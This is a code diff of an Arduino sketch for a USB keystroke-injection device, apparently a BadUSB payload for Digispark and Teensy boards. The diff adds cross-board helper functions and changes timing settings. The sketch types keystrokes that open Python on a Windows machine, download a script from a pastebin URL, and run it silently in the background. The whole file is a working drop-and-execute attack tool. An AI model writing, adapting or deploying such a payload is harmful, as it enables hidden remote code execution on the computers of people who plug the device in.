@@ -24,48 +24,90 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 ============================================================================*/
 
-#include "DigiKeyboard.h"
-
 /* SETTINGS */
 #define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5"
 #define PY_SCRIPT_NAME "pyscr.py"
 
+#define TEENSY //only do this if programming a teensy
 #define UK_KEYBOARD
 
-#define START_DELAY 500
-#define START_MENU_DELAY 1200
-#define START_MENU_SEARCH_DELAY 400
-#define PYTHON_WINDOW_OPEN_DELAY 600
+#define START_DELAY 1200
+#define START_MENU_DELAY 600
+#define START_MENU_SEARCH_DELAY 100
+#define PYTHON_WINDOW_OPEN_DELAY 300
+
+#ifdef TEENSY
+  #define US_KEYBOARD
+#else
+  #include "DigiKeyboard.h"
+#endif
+
+
+void print(char* str) {
+  //print on both teensy and dspark
+  #ifdef TEENSY
+    Keyboard.print(str);
+  #else
+    DigiKeyboard.print(str);
+  #endif
+}
+void wait(int t) {
+  //delay on both teensy and dspark
+  #ifdef TEENSY
+    delay(t);
+  #else
+    DigiKeyboard.delay(t);
+  #endif
+}
+void winKey() {
+  //windows key on both teensy and dspark
+  #ifdef TEENSY
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.release(KEY_LEFT_GUI);
+  #else
+    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  #endif
+}
+void enter() {
+  //windows key on both teensy and dspark
+  #ifdef TEENSY
+    Keyboard.press(KEY_ENTER);
+    Keyboard.release(KEY_ENTER);
+  #else
+    DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
+  #endif
+}
 
 
 
 void setup() {
   /*   Open python prompt   */
-  DigiKeyboard.delay(START_DELAY);
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-  DigiKeyboard.delay(START_MENU_DELAY);
-  DigiKeyboard.print("python.exe");
-  DigiKeyboard.delay(START_MENU_SEARCH_DELAY);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(PYTHON_WINDOW_OPEN_DELAY);
+  wait(START_DELAY);
+  winKey();
+  wait(START_MENU_DELAY);
+  print("python.exe");
+  wait(START_MENU_SEARCH_DELAY);
+  enter();
+  wait(PYTHON_WINDOW_OPEN_DELAY);
 
   
   /*   Python script   */
   // All is in one line but split into multiple prints for readability
-  DigiKeyboard.print("import subprocess,os,urllib.request as r;");
+  print("import subprocess,os,urllib.request as r;");
   // Change directory to home as we may not have permission to edit in the python folder
-  #ifdef UK_KEYBOARD
-    DigiKeyboard.print("os.chdir(os.path.expanduser('|'));");
-  #elif US_KEYBOARD
-    DigiKeyboard.print("os.chdir(os.path.expanduser('~'));");
+  #ifdef US_KEYBOARD
+    print("os.chdir(os.path.expanduser('~'));");
+  #elif Uk_KEYBOARD
+    print("os.chdir(os.path.expanduser('|'));");
   #endif
   // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
-  DigiKeyboard.print("f=open('");DigiKeyboard.print(PY_SCRIPT_NAME);DigiKeyboard.print("','wb');");
-  DigiKeyboard.print("f.write(r.urlopen('");DigiKeyboard.print(PY_SCRIPT_URL);DigiKeyboard.print("').read());");
-  DigiKeyboard.print("f.close();");
+  print("f=open('");print(PY_SCRIPT_NAME);print("','wb');");
+  print("f.write(r.urlopen('");print(PY_SCRIPT_URL);print("').read());");
+  print("f.close();");
   // Open the script we just made with pythonw (so it runs in background)
-  DigiKeyboard.print("subprocess.Popen('pythonw.exe ");DigiKeyboard.print(PY_SCRIPT_NAME);DigiKeyboard.print("',creationflags=8,close_fds=True);");
+  print("subprocess.Popen('pythonw.exe ");print(PY_SCRIPT_NAME);print("',creationflags=8,close_fds=True);");
   // Close python prompt when done
-  DigiKeyboard.print("exit();");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  print("exit();");
+  enter();
 }void loop() {}
+
